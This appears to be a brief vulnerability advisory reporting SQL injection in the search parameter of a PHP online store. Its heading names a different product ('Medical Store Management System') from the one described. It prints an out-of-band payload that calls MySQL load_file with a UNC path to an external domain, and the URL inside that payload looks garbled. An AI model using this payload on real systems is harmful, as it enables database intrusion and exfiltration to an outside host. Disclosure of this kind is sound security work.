## CVE-Medical Store Management System v1.0


## Description:
The search parameter on Cosmetics-and-Beauty-Product-Online-Store v1.0
appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\u0vw93wpos6gspupnz9fqeiy6pci0io9rxik98y.https://www.sourcecodester.com/php/15181/cosmetics-and-beauty-product-online-store-phpoop-free-source-code.html\\vcu'))+'

This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
WARNING: If this is in some external domain, or some subdomain, or
internal, this will be extremely dangerous!
